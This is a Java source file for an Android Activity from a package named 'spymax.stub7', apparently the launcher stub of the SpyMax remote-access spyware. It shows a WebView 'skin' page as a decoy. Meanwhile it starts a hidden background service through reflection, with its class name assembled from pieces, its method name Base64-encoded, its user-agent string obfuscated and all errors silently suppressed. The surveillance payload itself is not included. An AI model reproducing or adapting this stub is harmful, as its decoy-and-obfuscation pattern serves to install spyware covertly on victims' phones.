package spymax.stub7;

import android.app.Activity;
import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.Toast;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


public class _skin_cls_ extends Activity {
    private class MyChrome extends WebChromeClient {

        private View mCustomView;
        private WebChromeClient.CustomViewCallback mCustomViewCallback;
        protected FrameLayout mFullscreenContainer;
        private int mOriginalOrientation;
        private int mOriginalSystemUiVisibility;

        MyChrome() {}

        public Bitmap getDefaultVideoPoster()
        {
            if (mCustomView == null) {
                return null;
            }
            return BitmapFactory.decodeResource(getApplicationContext().getResources(), 2130837573);
        }

        public void onHideCustomView()
        {
            ((FrameLayout)getWindow().getDecorView()).removeView(this.mCustomView);
            this.mCustomView = null;
            getWindow().getDecorView().setSystemUiVisibility(this.mOriginalSystemUiVisibility);
            setRequestedOrientation(this.mOriginalOrientation);
            this.mCustomViewCallback.onCustomViewHidden();
            this.mCustomViewCallback = null;
        }

        public void onShowCustomView(View paramView, WebChromeClient.CustomViewCallback paramCustomViewCallback)
        {
            if (this.mCustomView != null)
            {
                onHideCustomView();
                return;
            }
            this.mCustomView = paramView;
            this.mOriginalSystemUiVisibility = getWindow().getDecorView().getSystemUiVisibility();
            this.mOriginalOrientation = getRequestedOrientation();
            this.mCustomViewCallback = paramCustomViewCallback;
            ((FrameLayout)getWindow().getDecorView()).addView(this.mCustomView, new FrameLayout.LayoutParams(-1, -1));
            getWindow().getDecorView().setSystemUiVisibility(3846 | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        mWebView.saveState(outState);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        mWebView.restoreState(savedInstanceState);
    }
   // WebView wb;

    WebView mWebView;
    @Override
    public void onCreate(Bundle v) {
        super.onCreate(v);
       //
        try {
            setContentView(R.layout.wib);
            mWebView=(WebView)findViewById(R.id.webView1);
            mWebView.getSettings().setJavaScriptEnabled(true);
            mWebView.getSettings().setLoadWithOverviewMode(true);
            mWebView.getSettings().setUseWideViewPort(true);
            mWebView.getSettings().setAllowFileAccess(true);
            mWebView.getSettings().setAppCacheEnabled(true);

            mWebView.getSettings().setBuiltInZoomControls(false);
            mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
            mWebView.getSettings().setUserAgentString(System.getProperty(ClassGen3._Reblace_("ht[RANDOM-STRING]tp.agent", "[RANDOM-STRING]")));
            mWebView.setDownloadListener(new DownloadListener() {

                @Override
                public void onDownloadStart(String url, String userAgent,
                                            String contentDisposition, String mimetype,
                                            long contentLength) {
                   try
                   {
                       DownloadManager.Request request = new DownloadManager.Request(
                               Uri.parse(url));
                       final String filename= URLUtil.guessFileName(url, contentDisposition, mimetype);
                       request.allowScanningByMediaScanner();
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED); //Notify client once download is completed!
                       request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);
                       DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                       dm.enqueue(request);
                   }catch (Exception e){}


                }
            });
            mWebView.setWebViewClient(new WebViewClient());
            mWebView.setWebChromeClient(new MyChrome());
            mWebView.loadUrl("skin.info");
            Context x = getApplicationContext();
//            if (ClassGen10.r(_engine_wrk_.class, x)) {
//                startService(new Intent(this, _engine_wrk_.class));
//
//            }
            if(ClassGen10._runn_srv_(ClassGen11.class,x)) {
                Intent i = new Intent(x, ClassGen11.class);
                //ClassGen3.StartNewScan(x,i);

                String funClass = "spymax"+"."+"stub7"+"."+"ClassGen3";
                Class c = null;
                try {
                    c = Class.forName(funClass);
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }


                Object o = null;
                try {
                    o = c.newInstance();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    e.printStackTrace();
                }

                Class[] paramTypes = new Class[2];
                paramTypes[0]= Context.class;
                paramTypes[1]=Intent.class;
                String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

                Method m = null;
                try {
                    m = c.getDeclaredMethod(methodName, paramTypes);
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                }

                try {
                    m.invoke(o, new Object[]{x,i});
                } catch (IllegalAccessException e) {
                   // e.printStackTrace();
                } catch (InvocationTargetException e) {
                   // e.printStackTrace();
                }
            }

        }catch (Exception e ){}

        //finish();
    }

    @Override
    public void onBackPressed() {
        if (mWebView.canGoBack()) {
            mWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
//    @Override
//    public void finish() {
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }
}
